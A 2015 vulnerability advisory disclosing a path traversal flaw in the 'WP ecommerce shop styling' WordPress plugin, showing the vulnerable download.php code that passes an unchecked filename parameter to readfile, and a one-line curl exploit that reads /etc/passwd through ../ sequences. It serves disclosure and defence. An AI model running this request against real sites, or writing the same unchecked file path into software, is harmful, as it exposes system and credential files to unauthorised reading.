Author: Larry W. Cashdollar, @_larry0
Date: 2015-07-05
Vendor Notified: 2015-07-05, fixed in version 2.6.
Vendor Contact: http://wpshopstyling.com
Description: Customize your WP ecommerce store with HTML mail templates, message content, transaction results and PDF invoices with WYSIWYG editor and placeholders.
Vulnerability:


1 <?php
2 require_once("../../../../wp-admin/admin.php");
3 
4 header(&#039;Content-disposition: attachment; filename=&#039;.$_GET[&#039;filename&#039;]);
5 header(&#039;Content-type: application/pdf&#039;);
6 readfile(HAET_INVOICE_PATH.$_GET[&#039;filename&#039;]);
7 ?>

You&#039;ll have to rename the download file via mv -- -..-..-..-..-..-..-..-..-etc-passwd passwd as the filename is set to the download filename with path.

CVEID: Requested TBD  
OSVDB: TBD

Exploit Code:
  â€¢ $ curl http://www.example.com/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../../../../../../etc/passwd

